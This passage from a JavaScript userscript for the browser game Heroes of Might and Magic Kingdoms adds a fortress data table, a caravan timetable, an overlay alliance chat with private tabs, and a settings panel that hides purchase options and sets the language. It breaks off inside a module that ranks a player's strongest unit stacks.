			if ( !levelUnits )
				cellData = getHTMLForEmptyLevel( fortress, level );
			else
				cellData = getHTMLForLevel( fortress, level );
			
			var cell = document.getElementById( 'Fortress-level-' + (level-1) + '-' +  fortress.id );
			cell.innerHTML = cellData;
		}
		
		tooltipCSSConfigure();
		if ( json.d ) {	// only if fortress received by "Get fortress" button.
			var table = document.getElementById('runic_fortress');
			var index = 0;
			for( index = numToReceive; index < table.rows.length; index++) {
				if ( table.rows[index].style.display != 'none' ) {
					numToReceive = index+1;
					var cell = table.rows[index].cells.namedItem("sortParams");
					var regionId = parseInt( getSubNodeWithId( cell, 'regionId' ).innerHTML );
					HOMMK_user.func.doAsyncRequest( {"elParamList":[{"elementType":"RunicFortressRegionBuildingFrame","elementId":regionId}]}, fillFortressData );
					break;
				}
			}
			if ( index == table.rows.length ) {
				numToReceive = table.rows.length + 1;
				document.getElementById('GET_FILTERED_FORTRESS').value = 'Get Selected';
			}
		}
	}
	
	function receiveFortressData() {
		if ( document.getElementById('GET_FILTERED_FORTRESS').value == 'Stop' ) {
			numToReceive = document.getElementById('runic_fortress').rows.length + 1;
			document.getElementById('GET_FILTERED_FORTRESS').value = 'Get Selected';
		}
		else {
			document.getElementById('GET_FILTERED_FORTRESS').value = 'Stop';
					
			numToReceive = 0;
			var table = document.getElementById('runic_fortress');
			for( var i=numToReceive; i < table.rows.length; i++) {
				if ( table.rows[i].style.display != 'none' ) {
					numToReceive = i+1;
					var cell = table.rows[i].cells.namedItem("sortParams");
					var regionId = parseInt( getSubNodeWithId( cell, 'regionId' ).innerHTML );
					HOMMK_user.func.doAsyncRequest( {"elParamList":[{"elementType":"RunicFortressRegionBuildingFrame","elementId":regionId}]}, fillFortressData );
					break;
				}
			}
		}
	}
	function receiveDataForFortress( regionId ) {
		var table = document.getElementById('runic_fortress');
		numToReceive = table.rows.length + 1;
		HOMMK_user.func.doAsyncRequest( {"elParamList":[{"elementType":"RunicFortressRegionBuildingFrame","elementId":regionId}]}, fillFortressData );
	}
	HOMMK_user.func.receiveDataForFortress = receiveDataForFortress;
	
	function fortressSorts_changer( eventData ){
		var v = '';
		if ( eventData != 0 )
			var v = $(this).find(':selected').val();
		var sortData = new Array();
		var table = document.getElementById('runic_fortress');

		for( var i=0; i < table.rows.length; i++) {
			sortData[i] = new Array();
			var cell = table.rows[i].cells.namedItem("sortParams");
			if ( v == "attack" )
				sortData[i][0] = HOMMK_user.func.getSubNodeWithId( cell, 'sortParAttack' ).innerHTML;
			else if ( v == "capture" )
				sortData[i][0] = HOMMK_user.func.getSubNodeWithId( cell, 'sortParCapture' ).innerHTML;
			else if ( v == "owner" )
				sortData[i][0] = HOMMK_user.func.getSubNodeWithId( cell, 'sortParOwner' ).innerHTML;
			else// if ( v == "name" )
				sortData[i][0] = HOMMK_user.func.getSubNodeWithId( cell, 'sortParName' ).innerHTML;
			sortData[i][1] = table.rows[i];
		}
		sortData.sort();
		
		for( var i=0; i < sortData.length; i++ )
			table.appendChild( sortData[i][1] );
		return 1;
	}
	
	function fortressFilter_changer(){
		var v = $(this).find(':selected').val();
		var table = document.getElementById('runic_fortress');
		for( var i=0; i < table.rows.length; i++) {
			var cell = table.rows[i].cells.namedItem("sortParams");
			if ( v == "AllFortres" )
				table.rows[i].style.display = 'table-row';
			else if ( HOMMK_user.func.getSubNodeWithId( cell, 'sortParOwner' ).innerHTML == v )
				table.rows[i].style.display = 'table-row';
			else
				table.rows[i].style.display = 'none';
		}
		return 1;
	}
	
	var tooltipShow = false;
	function tooltipRefresh()
	{	// TODO: make switch for situation
		if ( document.getElementById( 'time_element' ) )
			document.getElementById( 'time_element' ).innerHTML= HOMMK.DateUtils.durationToString(0 + parseInt(document.getElementById( 'time_data' ).innerHTML) - HOMMK.DateUtils.getCurrentTimestamp(), HOMMK.DATEUTILS_TIME_FORMAT_LOCALE_DAYS_LONG);
		if ( document.getElementById( 'time_of_getting' ) )
			document.getElementById( 'time_of_getting' ).innerHTML= HOMMK.DateUtils.durationToString(60*60*24 - HOMMK.DateUtils.getCurrentTimestamp() + parseInt(document.getElementById( 'time_capture' ).innerHTML), HOMMK.DATEUTILS_TIME_FORMAT_LOCALE_DAYS_LONG);
		
		if ( tooltipShow )
			var t = setTimeout(tooltipRefresh, 1000);
	}
	function tooltipDisplayR(e) {
		var c = $(this).children('.hiddenTooltip').clone().show();
		$tooltip.empty().append(c).show();
		tooltipShow = true;
		tooltipRefresh();
	}
	function tooltipDisplayS(e) {
		var c = $(this).children('.hiddenTooltip').clone().show();
		if ( c.length == 0 )
			return;
		$tooltip.css({width:'190px'});
		$tooltip.empty().append(c).show();
	}
	function tooltipCSSConfigure() {
		$('.hiddenTooltip').css({
			width:'100%',
			margin:'5px',
			display:'none'
		});
		$('.hiddenTooltip div').css({
			margin:'0px'
		});
		$('.hiddenTooltip .tooltipTitle').css({
			color:'white',
			backgroundColor:'black',
			textAlign:'center',
			fontWeight:'bolder',
			marginRight:'10px'
		});
	}
	function configureFortress( HTML ) {
		$('#data-tabs-6').html(HTML);
		tooltipCSSConfigure();
		fortressSorts_changer( 0 );
		
		$('#FORTRESS_FILTER').change(fortressFilter_changer);
		$('#FORTRESS_SORTS').change(fortressSorts_changer);
		$('#GET_FILTERED_FORTRESS').click(receiveFortressData);
			
		if ( HOMMK_user.RunicFortress.info ) {
			for ( var curFortress in HOMMK_user.RunicFortress.info )
				fillFortressData( curFortress );
		}

		$('.hommk-fortress-date').mousemove( tooltipMove );
		$('.hommk-fortress-date').hover( tooltipDisplayR, function(){$tooltip.hide();tooltipShow=false; }	);
		$('.hommk-fortress-gate').mousemove( tooltipMove );
		$('.hommk-fortress-gate').hover( tooltipDisplayS, function(){$tooltip.hide();}	);
		$('.hommk-fortress-level').mousemove( tooltipMove );
		$('.hommk-fortress-level').hover( tooltipDisplayS, function(){$tooltip.hide();}	);
	}
	function buildFortress(){
		if ( !HOMMK_user.RunicFortress )
			HOMMK_user.RunicFortress = new Object();
		if ( !HOMMK_user.RunicFortress.list )
			HOMMK_user.RunicFortress.list = new Array();
		if ( !HOMMK_user.RunicFortress.info )
				HOMMK_user.RunicFortress.info = new Array();
		var data_fortress = '';

		var HTML = "";
		function fortressDataCallback( json) {
			HTML = fillFortressList( json );
			configureFortress( HTML );
		}
		if ( HOMMK.elementPool.obj.RegionBuildingListFrame ) {
			HTML = fillFortressList();
			configureFortress( HTML );
		}
		else
			HOMMK_user.func.doAsyncRequest( {"elParamList":[{"elementType":"RegionBuildingListFrame","elementId":HOMMK.player.content.worldId}]}, fortressDataCallback );
	}function buildAction(){
	var i, caravan;
	var actions = {
		"CARAVAN_DELIVERY":[],
		"BUILD_CITYBUILDING":[],
		"IMPROVE_MINE":[],
		"OTHERS":[]
		};
	HOMMK.elementPool.obj.MasterAction.values().forEach(function(a){
		if(actions[a.content.type])
			actions[a.content.type].push(a);
		else
			actions["OTHERS"].push(a);
	});


	function sort_by_date(a,b){
		return a.content.endDate<b.content.endDate?-1:1;
	}

	actions["CARAVAN_DELIVERY"].sort(sort_by_date);

	var HTML = '<table width="100%" border="1"><tr><th>Caravans</th><th>Start</th><th>Arrival</th><th>Back</th></tr>';

	function local_time(date){
		var hours = date.getHours();
		var minutes = date.getMinutes();
		if(minutes<10) minutes = '0'+minutes;
		var seconds = date.getSeconds();
		if(seconds<10) seconds = '0'+seconds;
		return hours+':'+minutes+':'+seconds;
	}
	
	
	for(i=0;i<actions["CARAVAN_DELIVERY"].length;i++){
		caravan = actions["CARAVAN_DELIVERY"][i];
		c = caravan.content;
		$img = $(caravan.container.innerHTML).children('#MasterAction'+caravan.elementId+'Image').clone().css({
			'position':'static',
			'float':'left'
		});
		res = c.params.split(';').slice(1).join(' ');
		start = local_time(new Date(1000*c.startDate));
		come = local_time(new Date(1000*c.attachedSlaveActionList[c.attachedSlaveActionList.length-1].startDate));
		end = local_time(new Date(1000*c.endDate));
		HTML += '<tr><td>'+$img[0].outerHTML+c.actionDescription+'<br/>'+res+'</td><td>'+start+'</td><td>'+come+'</td><td>'+end+'</td></tr>';
		
	
	}


	HTML += '</table>';

	$('#data-tabs-5').html(HTML);

}	
	
	
	// tabs width
	$panel.find('.ui-tabs-nav li').css({
		'width':Math.floor(98/$tabs.tabs('length'))+'%',
	});
	
	// global css
	$('#data-tabs div').css({
		"text-align":'center',
		"font-wieght":'bold'
	});
	
	// table css
	$('#data-tabs div table').css({
		color:'black',
		backgroundColor:'white',
		width:'100%',
	});
	
	// others css
	$('.icone').css({'width':'16px','margin-right':'16px'});
	$('.discret').css({	color:'gray',"font-weight":'lighter'});
	
	$('#data-tabs-4').css({
		maxHeight:'500px',
		overflow:'auto'
	});
	
	
	
	//refresh();
	
	
		toobar_button('<img src="http://img834.imageshack.us/img834/9264/infotj.png" /> '+localize("DATA_BUTTON"),function() {
			setTimeout(function(){
				toggle_dialog( $panel );
				if($panel.dialog( "isOpen" )){
					buildArtefacts();
					buildRessources();
					buildTroops();
					buildSpells();
					buildAction();
					buildFortress();
				}
			},50);
			return false;
	    });
})();
(function(){

	console.log('chat');
	var openChat={};
// CLOSABLE
(function () {
    var c = $.ui.tabs.prototype._tabify;
    $.extend($.ui.tabs.prototype, {
        _tabify: function () {
            var a = this;
            c.apply(this, arguments);
            a.options.closable === true && this.lis.filter(function () {
                return $("span.ui-icon-circle-close", this).length === 0
            }).each(function () {
                $(this).append('<a href="#"><span class="ui-icon ui-icon-circle-close"></span></a>').find("a:last").hover(function () {
                    $(this).css("cursor", "pointer")
                }, function () {
                    $(this).css("cursor", "default")
                }).click(function () {
                    var b = a.lis.index($(this).parent());
                   // if (b > -1) {
                   //     if (false === a._trigger("closableClick", null, a._ui($(a.lis[b]).find("a")[0], a.panels[b]))) return;
                   //     a.remove(b)
                   // }
					//else{
						var li = $(this).parent();
						var href = li.children('a:first').attr('href');
						li.remove();
						//console.log(href);
						var panel = $(href);
						//console.log(panel);
						panel.hide();
						var id = href.split('-');
						id = id[id.length-1];
					//	console.log(id);
						delete openChat['c'+id];
		$chat.tabs({"selected":"#hommk-gold-chat-tabs-alliance"});
					//}
                    return false
                }).end()
            })
        }
    })
})(jQuery);


	
	HOMMK.UPDATEPUSH_DELAY=HOMMK.UPDATEPUSH_MIN_DELAY=8000;
	//HOMMK.UPDATEPUSH_DELAY_INACTIVE=HOMMK.UPDATEPUSH_MIN_DELAY_INACTIVE=10000;
	
	//HOMMK.scheduleNextUpdatePushRequest(2000);
	
	/*setInterval(function(){
		var a = HOMMK.playerIsInactive();
        HOMMK.lastActivityDate = new Date();
        if (a) {
            w.LogUtils.debug("Player became active");
            HOMMK.scheduleNextUpdatePushRequest(HOMMK.UPDATEPUSH_FORCED_DELAY);
        }
	},15000);*/
	
    //HOMMK.scheduleNextUpdatePushRequest(HOMMK.UPDATEPUSH_FORCED_DELAY);
			
	// IF NOT ALLIANCE
	if(!HOMMK.player.content.allianceId)
		return;
		
	// DRAG OUTSIDE OF WINDOW
	var draggable = $.ui.dialog.prototype._makeDraggable;
	$.ui.dialog.prototype._makeDraggable = function() { 
		draggable.apply(this,arguments);
		this.uiDialog.draggable({
			containment: false
		});
	};
	
	//console.log($.ui.dialog.prototype._makeDraggable);
	
	// AJAX REQUEST
	function sendMessage(txt,player,type){
		player = player || "";
		type = type || "alliance";
		var a = {
			text: txt,
			to: player,
			type: type
		};
		try{
			new HOMMK.JsonRequestHandler(HOMMK.CHAT_URL,{}).send(a);
		}
		catch(e){
			window.top.location.href  = 'javascript:new HOMMK.JsonRequestHandler(HOMMK.CHAT_URL,{}).send('+JSON.stringify(a)+');void 0;';
		}
	}
	
	var lastMsg;
	
	var intervals = {};
	// onclick="return false;"
	var $chat = $('\
		<div id="hommk-gold-chat-tabs"><div>\
			<ul>\
				<li><a id="hommk-gold-chat-tabs-main" href="#hommk-gold-chat-tabs-alliance">alliance</a></li>\
				<li><a id="hommk-gold-chat-tabs-main2"href="#hommk-gold-chat-tabs-about">about</a></li>\
			</ul>\
			<div id="hommk-gold-chat-tabs-alliance">\
				<div class="hommk-gold-chat-user">loading..</div>\
				<textarea id="hommk-gold-chat-writer"></textarea>\
				<div id="hommk-gold-chat-box"></div>\
			</div>\
			<div id="hommk-gold-chat-tabs-about"><br/>\
				<br/><b>Refresh:</b> every 6 sec (instead 30)<br/>\
				<br/><b>Message Size:</b> unlimited characters (instead 130)<br/>\
				<br/><b>Scroll:</b> From Top<br/>\
				<br/><b>URL:</b> Now Clickable.<br/>\
				<br/><b>Addon:</b> online player list<br/>\
			<br/></div>\
		</div></div>\
	');
	
	
	var pos = 1010;
	var width = $(window).width();
	if(  width > (pos+570) ){
		pos =  width - 285;
	}
	else if(  width > pos ){
		pos = (1010 + width)/ 2;
	}
	
	
	var position = localStorage_getObject("HOMMK_chat_position",{left:pos,top:''}); 
	//console.log(position.left);
	if(position.top && position.top<20)
		position.top = 20;
	$chat.dialog({
		autoOpen:false,
		resizable:false,
		title:'Chat',
		zIndex:90000,
		width:570,
		position: [position.left,position.top],
		dragStop: function(e,ui) { 
			//console.log(ui.position);
			localStorage_setObject("HOMMK_chat_position",ui.position);
			position = ui.position;
		},
		open:function(){
			$chat.parent().css('left',position.left+'px');
			if(position.top)
				$chat.parent().css('top',position.top+'px');
			if(width > 1580) // not for small screens
				$(window.document).scrollLeft(9999);//pos+600-$(window).width()
			
			$chat.tabs({selected:"#hommk-gold-chat-tabs-alliance"});
			//$box.attr({ scrollTop: $box.attr("scrollHeight") });
			$writer.focus();
			
			intervals.ally = setInterval(checkPlayerList,30000);
			checkPlayerList();
			
			localStorage_setObject("HOMMK_chat_open",1);
		},
		close:function(e,ui){
			clearInterval(intervals.ally);
			localStorage_setObject("HOMMK_chat_open",0);
		}
	});
	$chat.tabs({closable:true});
	//$chat.click(function(){return false;});
	


	// BOX CSS 
	$box = $('#hommk-gold-chat-box').css({
		backgroundColor:'white',
		width:'398px',
		height:'350px',
		position:'relative',
		overflowY:'auto',
		color:'black'
	});
	
	// USER LIST 
	var $user_list = $('.hommk-gold-chat-user').css({
		backgroundColor:'lightgray',
		width:'94px',
		height:'375px',
		position:'absolute',
		right:'21px',
		overflowY:'auto',
		color:'black',
		padding:'10px'
	});
	
	// ABOUT TABS 
	$('#hommk-gold-chat-tabs-about').css({
		width:'510px',
	});
	
	// MESSAGE 
	$('.hommk-gold-chat-box-line').css({
		borderBottom: 'solid gray 1px',
		padding:'5px',
		paddingLeft:'60px',
		position:'relative'
	});
	
	// DATE
	$('.hommk-gold-date').css({
		fontSize:'smaller',
		color:'gray',
		position:'absolute',
		top:0,
		right:0
	});
	
	// INPUT 
	var $writer = $('#hommk-gold-chat-writer').css({
		width:'394px',
		height:'40px',
		backgroundColor:'lightyellow',
		marginBottom:'5px'
	}).keypress(function(event) {  
		if ( event.which != 13 ) 
			return;
		event.preventDefault();
		sendMessage($(this).val());
		$(this).val("");
	});
	
	var $visibleBox = $box;
	
	// IS BOTTOM
	function isBottom(){
		return $visibleBox[0].scrollHeight - $visibleBox.scrollTop() == $visibleBox.outerHeight();
	}
	// REFRESH
	function refresh(){
		if(!$chat.dialog('isOpen'))
			return 0;
			
		var newMsg = HOMMK.elementPool.obj.Chat.obj[HOMMK.player.content.id].log.values();
		var index = newMsg.indexOf(lastMsg);
		
		msg = HOMMK.elementPool.obj.Chat.obj[HOMMK.player.content.id].log.values().slice(index+1);
		if(msg.length == 0)
			return;
		
		//var bottom = isBottom();
		
		for(var i=0;i<msg.length;i++){
			var date = msg[i].sentDate;
			date = HOMMK.DateUtils.timestampToString(date,HOMMK.DATEUTILS_TIME_FORMAT_LOCALE_DATE_STRING_SHORT)+' - '+HOMMK.DateUtils.timestampToString(date,HOMMK.DATEUTILS_TIME_FORMAT_LOCALE_TIME_STRING);
			var $tmp = $box;
			if(msg[i].type == "p2p"){
				var id = (msg[i].from_playerId!=HOMMK.player.content.id)?msg[i].from_playerId:msg[i].to_playerId;
				var name = (msg[i].from_playerName!=HOMMK.player.content.name)?msg[i].from_playerName:msg[i].to_playerName;
				$tmp = newChat(id,name).box;
			}
			/*w.cliquableFrame = function(e){
				console.log(e);
				var target = e.target || e.srcElement;
				var $target = $(target);
				var width = $target.width(), height = $target.height(), href = target.href;
	
				var style = "color:blue;"
				style += 'font-weight:' + $target.css('font-weight') + ';';
				style += 'font-size:' + $target.css('font-size') + ';';
				style += 'font-family:' + $target.css('font-family') + ';';
				style += 'font-style:' + $target.css('font-style') + ';';
				
				
				var myIframe = document.createElement('iframe');
				myIframe.style.width = width + "px";
				myIframe.style.height = height + "px";
				myIframe.style.padding = "0";
				myIframe.style.margin = "0";
				myIframe.style.display = "inline";
				myIframe.setAttribute("scrolling","no");
				myIframe.setAttribute("frameborder","0");
				
				$target.replaceWith($(myIframe));

				myIframe.contentWindow.document.write("<a href='"+href+"' target='_blank' style='"+style+"'>"+href+"</a>");
				myIframe.contentWindow.document.body.style.padding = "0";
				myIframe.contentWindow.document.body.style.margin = "0";
			};*/
			var $line = $('<div id="hommk-gold-chat-msg-'+msg[i].id+'" class="hommk-gold-chat-box-line"><span class="hommk-gold-date">'+date+'</span><b>' + msg[i].from_playerName + '</b><br/>' + msg[i].text.replace(new RegExp("((http://)[a-zA-Z0-9/.%\-=?#&_]+)+","gi"),"<a href='$1' target='_blank' style='color:blue;'  >$1</a>") + '</div>')
				.prependTo($tmp)
				.css({
					borderBottom: 'solid gray 1px',
					padding:'5px',
					paddingLeft:'60px',
					position:'relative'
				});

			//onmouseover='var e=arguments[0]||event;cliquableFrame(e);'
			// ICON
			if($('#playerIcon_'+msg[i].from_playerId).length){
				$line.append($('#playerIcon_'+msg[i].from_playerId).clone().css({position:'absolute',top:0,left:0}));
			}
			
			lastMsg = msg[i];
		}
		//if(bottom)
			//$visibleBox.attr({ scrollTop: $visibleBox.attr("scrollHeight") });
		$('.hommk-gold-date').css({
			fontSize:'smaller',
			color:'gray',
			position:'absolute',
			top:0,
			right:0
		});
	}
	
	var allianceList={},init=0;
	
	$chat.tabs({
	   show: function(event, ui) { 
			if(ui.panel.id == "hommk-gold-chat-tabs-alliance"){
				$('#hommk-gold-chat-writer').focus();
				//$box.attr({ scrollTop: $box.attr("scrollHeight") });
				$visibleBox = $box;
			}
			else if(ui.panel.id != "hommk-gold-chat-tabs-about"){
				$('#'+ui.panel.id).children('textarea').focus();
				var info = ui.panel.id.split('-');
				var id = info[info.length-1];
				
				var $bbox = openChat['c'+id].box;
				//$bbox.attr({ scrollTop: $bbox.attr("scrollHeight") });
				$visibleBox = $bbox;
			}
	   }
	});
	
	//1
	
	
	function newChat(id,name){
		if(!$chat.dialog('isOpen'))
			return 0;
		if(!openChat['c'+id]  ){ //|| !$chat.children("#hommk-gold-chat-player-"+id).length
			name = (name || allianceList['p'+id]).substring(0,7);
			if( $('#hommk-gold-chat-player-'+id).length ){
				$panel = $('#hommk-gold-chat-player-'+id);
				var $user = $panel.children(':first-child');
				$writer = $user.next();
				$box = $writer.next();
				$panel.show();
			}
			else{
				var $panel = $('#hommk-gold-chat-tabs-alliance').clone().attr('id','hommk-gold-chat-player-'+id).addClass('ui-tabs-hide');
				var $user = $panel.children(':first-child');//.attr('class','hommk-gold-chat-user-player-'+id);
				var $writer = $user.next().attr('id','hommk-gold-chat-writer-player-'+id)
				.keypress(function(event) {  
					if ( event.which != 13 ) 
						return;
					event.preventDefault();
					sendMessage($(this).val(),allianceList['p'+id],'p2p');
					$(this).val("");
				});
				var $box = $writer.next().attr('id','hommk-gold-chat-box-player-'+id).empty();
				$chat.append($panel);
			}
			openChat['c'+id] = {link:"#hommk-gold-chat-player-"+id,box:$box,writer:$writer};
			$chat.tabs( "add" , "#hommk-gold-chat-player-"+id , name ,  $chat.tabs( "length" )-1 );
		}
		return openChat['c'+id];
	}
	
	// OPEN CHAT BY PLAYER ID
	w.openChat = function(id){
		if(!openChat['c'+id] || !$chat.children("#hommk-gold-chat-player-"+id).length){
			newChat(id);
		}
		$chat.tabs({"selected":openChat['c'+id].link});
	}
	
	// MEMBERS LIST UPDATE
	function updatePlayerList(json){
		var $html = "";
		var data = json.d['ViewAllianceFrame'+HOMMK.player.content.allianceId].attachedPlayerList;
		for(var i=0;i<data.length;i++){
			if(data[i].status == "ONLINE" && data[i].id!=HOMMK.player.content.id)
				$html += '<div style="padding-left:20px;cursor:pointer;" title="'+data[i].name+'" onclick="openChat('+data[i].id+');"><div style="position:absolute;left:10px;height:10px;width:10px;background-color:green;"></div> '+data[i].name.substring(0,10)+'</div>';
			if(!init)
				allianceList['p'+data[i].id] = data[i].name;
		}
		init=1;
		$('.hommk-gold-chat-user').html($html);
	}
	
	// MEMBERS LIST CHECK
	function checkPlayerList(){
		do_request(
			{"elParamList":[{"elementType":"ViewAllianceFrame","elementId":HOMMK.player.content.allianceId}]},
			updatePlayerList
		);
	}

	// REFRESH MESSAGES
	intervals.msg = setInterval(refresh,500);

	
	var $button = $('<div>chat</div>')
		.button()
		.css({
			position:'absolute',
			bottom:'7px',
			right:'9px',
			width:'55px',
			height:'20px',
			zIndex:90000
		})
		.appendTo($('#Container'))
		.click(function(){
			toggle_dialog( $chat );
		});
	
	if(localStorage_getObject("HOMMK_chat_open",1)){
		toggle_dialog( $chat );
	}
			
	
	$("#hommk-gold-chat-tabs-main").next().hide();
	$("#hommk-gold-chat-tabs-main2").next().hide();

	
})();
var buyables = (function(){
    var on;
    function init()
    {
      $('<style type="text/css" id="cssOverride"></style>')
		.appendTo($(document.getElementsByTagName("body")));
      on = localStorage_getObject("HOMMK_GOLD_buyables", false);
      setState( on );
    }
    function setState(newOn)
    {
		if(on != newOn)
		localStorage_setObject("HOMMK_GOLD_buyables", newOn);

		on = newOn;
		var display = (newOn) ? "" : "none";

		$('div[id$="CompleteViewCityOptionsContentContainer"]').css("display", display);

		if(newOn){
			$("#cssOverride").text("");
		}
		else{
			$("#cssOverride").text(
				// Anzeigen im Helden-Bildschirm
				[".heroTrainingContainer"
				,".heroPortraitContainer"
				// Optionen in der Stadt-Seitenbar
				,".cityOptionsTitle"
				// Avatarliste am unteren Rand
				,".avatarFriendsBox"
				,".avatarPortrait"
				,".avatarFoldButton"
				// Optionen in der Regions-Ansicht
				,".regionViewRegionNameTop"
				,".regionViewRegionNameContentBg"
				,".requisitionChoice"
				// Optionen in der Stadt-Ansicht
				//,".cityViewCityNameTop"
				//,".cityViewCityNameContentBg"
				].join(", ") + " { display: none; } .heroCapacityResume{top:402px}"
			);
			//console.log(	$('.heroCapacityResume').css()	);
		}
    }
    function getState(){
      return on;
    }
    return { init:init, set:setState, state:getState };
})();
buyables.init();
	// panel
	HOMMK_user.settings = {visible:localStorage_getObject("HOMMK_settings",false)};
	var position = localStorage_getObject("HOMMK_settings_position",{left:'',top:20});
	var $dialog_settings = $('<div id="hommk-gold-settings"></div>')
		.dialog({
			autoOpen: false,
			zIndex: 90000,
			resizable: false,
			title: localize("LINK_OPTION"),
			open: function(event, ui){   
				localStorage_setObject("HOMMK_settings", true );
				HOMMK_user.settings.visible=1;
			},
			close: function(event, ui){
				localStorage_setObject("HOMMK_settings", false );
				HOMMK_user.settings.visible=0;
			},
			dragStop: function(e,ui) { 
				localStorage_setObject("HOMMK_settings_position",ui.position);
			},
			position: [position.left,position.top]
		});
	
	
	$('<div/>')
		.text("Game's Options")
		.addClass('ui-widget-content ui-state-hover')
		.css({
			width:'120px',
			margin:'auto',
			position:'relative',
			textAlign:'center'
		})
		.appendTo($dialog_settings);
	
	//  buyable
	var $buyab = $('<input type="checkbox" id="buyabl" /><label for="buyabl">'+localize("BUYABLE_SETTING")+'</label>')
		.appendTo($dialog_settings)
		.css({
			marginTop:'10px',
			marginBottom:'20px'
		});
	$('#buyabl').attr('checked',buyables.state()?'checked':'').button().click(function(){
		if($(this).attr('checked')){
			buyables.set(1);
		}
		else{
			buyables.set(0);
		}
	});	
	
		
	$('<div/>')
		.text("Script's Options")
		.addClass('ui-widget-content ui-state-hover')
		.css({
			width:'120px',
			margin:'auto',
			position:'relative',
			textAlign:'center'
		})
		.appendTo($dialog_settings);
		
	// reset cookies
	var $reset = $('<div id="reset">'+localize("CLEAR_SETTING")+'</div>')
		.appendTo($dialog_settings)
		.css({marginTop:'10px'});
	$('#reset').button().click(function(){
		if(confirm('Are you sure to clear all local data ?')){
			localStorage.clear();
			alert('all local data have been cleared');
			top.location = top.location;
		}
	});	
	
	// theme switcher
	var $switcher = $('<div id="theme-switcher"></div>')
		.appendTo($dialog_settings)
		.css({marginTop:'10px'});
	$('#theme-switcher')
		.themeswitcher({width:270,buttonHeight:20});
		//
		//
		
	$languages = $('<div><input type="radio" name="lang" id="lg-en" value="en" '+(lang.selected=='en'?'checked="checked"':'')+' /><label for="lg-en"> English</label>'
				+'<br/><input type="radio" name="lang" id="lg-fr" value="fr" '+(lang.selected=='fr'?'checked="checked"':'')+' /><label for="lg-fr"> Français</label>'
				+'<br/><input type="radio" name="lang" id="lg-de" value="de" '+(lang.selected=='de'?'checked="checked"':'')+' /><label for="lg-de"> Deutsch</label>'
				+'<br/><input type="radio" name="lang" id="lg-es" value="es" '+(lang.selected=='es'?'checked="checked"':'')+' /><label for="lg-es"> Español</label>'
				+'<br/><input type="radio" name="lang" id="lg-ru" value="ru" '+(lang.selected=='ru'?'checked="checked"':'')+' /><label for="lg-ru"> русский</label>'
				+'<br/><input type="radio" name="lang" id="lg-zh" value="zh" '+(lang.selected=='zh'?'checked="checked"':'')+' /><label for="lg-zh"> 中国的</label>'
				+'<br/><input type="radio" name="lang" id="lg-ko" value="ko" '+(lang.selected=='ko'?'checked="checked"':'')+' /><label for="lg-ko"> 한국의</label>'
				+'<br/><input type="radio" name="lang" id="lg-new" value="new"  '+(("en|fr|de|es|ru|ko|zh".indexOf(lang.selected) == -1)?'checked="checked"':'')+' /><label for="lg-new"> <input type="text" size="8" id="lg-new2" '+(("en|fr|de|es|ru|ko|zh".indexOf(lang.selected) == -1)?'value="'+lang.selected+'"':'')+' /></label>'
				+'<br/><br/><input type="checkbox"4 id="lg-edit" '+(lang.edit?'checked="checked"':'')+' /><label for="lg-edit"> edit lang.</label>'
				+'<br/><br/><center><div id="lg-submit">Save</div></center>'
				+'</div>').dialog({
		autoOpen: false,
		zIndex: 90000,
		resizable: false,
		width:80,
		title: 'languages options'
	});
		
	$('#lg-submit').button().click(function(){
		lang.selected = $('input[name="lang"]:checked').val();
		if(lang.selected == 'new')
			lang.selected = $('#lg-new2').val();
		if(lang.selected == '')
			lang.selected = '_#';
		lang.edit = $('#lg-edit').attr("checked");
		localStorage_setObject('lang',lang);
		if(confirm("Changes have been saved. You need to reload page to take effects. Do you want to reload now ?"))
			top.location.href = top.location.href;
		$languages.dialog('close');
	});
	// languages selector
	var lang_button = $('<div id="lang_button">languages options</div>')
		.appendTo($dialog_settings)
		.css({margin:'10px 0'})
		.button().click(function(){
			toggle_dialog($languages);
	});
	// option : artefacts
	/*var $artef = $('<div id="artef" >export artefacts</div>')
		.appendTo($dialog_settings);
	$('#artef').button().click(scan_artefacts);*/
	
	/*
	// option : refresh
	var refresh = localStorage_getObject("HOMMK_settings_refresh",false);
	var $refresh = $('<input type="checkbox" id="hommk-gold-refresh" /><label for="hommk-gold-refresh">boost refresh</label>')
		.appendTo($dialog_settings);
	$('#hommk-gold-refresh').attr('checked',refresh?'checked':'').button().click(function(){
		if($(this).attr('checked')){
			localStorage_setObject("HOMMK_settings_refresh",true);
			HOMMK.UPDATEPUSH_DELAY=HOMMK.UPDATEPUSH_MIN_DELAY=3000;
			alert("chat will be refresh every 3 secondes (default: 30 sec)");
		}
		else{
			localStorage_setObject("HOMMK_settings_refresh",false);
			HOMMK.UPDATEPUSH_DELAY=HOMMK.UPDATEPUSH_MIN_DELAY=30000;
			alert("chat will be refresh every 30 secondes (default: 30 sec)");
		}
	});	
	
	if(refresh){
		HOMMK.UPDATEPUSH_DELAY=HOMMK.UPDATEPUSH_MIN_DELAY=3000;
	}*/
	
	$('#hommk-gold-settings .ui-button').css({width:'98%'});
			
			

	// toolbar button
	toobar_button('<img src="http://www.hommk.net/img/sett.png" /> '+localize("LINK_OPTION"),function() {
		toggle_dialog( $dialog_settings );
		return false;
	});
	
	
	if(HOMMK_user.settings.visible){
		toggle_dialog($dialog_settings);
	}
	
	(function(){

	var player = HOMMK.player.content;
		
	//console.log(HOMMK.elementPool);		
(function(){	
	// MODULE ALLIANCE
	if(player.worldId!=2841 || player.allianceId!=81)
		return;
	var date = (new Date()).getTime();
	var last_update = localStorage['last_google_update'] || 0;
	last_update = parseInt(last_update);
	if((last_update + 1000*60*60*24) > date){
		console.log(last_update+ 1000*60*60*24,date);
		return;
	}
	// update
	function getBestStack(){
		var stacks = HOMMK.elementPool.obj.UnitStack.values();
		var creatures = {},cre;
		for(var i=0;i<stacks.length;i++){
			cre = stacks[i].content;
			creatures[cre.unitEntityId] = creatures[cre.unitEntityId] || {tier:cre.tier,qty:0}; // name:cre.unitEntityName,power:cre.unitEntityPower,
			creatures[cre.unitEntityId].qty += cre.quantity; 
			creatures[cre.unitEntityId].pow = creatures[cre.unitEntityId].qty*cre.unitEntityPower;
		}
		var bests=[];
		for(var i in creatures){
			bests.push(creatures[i]);
		}
		bests.sort(function(a,b){return a.pow>b.pow?1:-1});
		bests = bests.slice(0,3);
		/*	pow = creatures[i].qty*creatures[i].power;
			if(pow>bestPower){
				bestPower=pow;
				bestUnit = creatures[i];
				bestUnit.power = pow;
			}
		}*/
		var bestUnit;
		for(var i=0;i<bests.length;i++){
			bestUnit = bests[i];
			if(bestUnit.pow>1000000)
				bestUnit.pow = parseInt(bestUnit.pow/1000000)+" M";
			else if(bestUnit.pow>1000)
				bestUnit.pow = parseInt(bestUnit.pow/1000)+" K";
		}
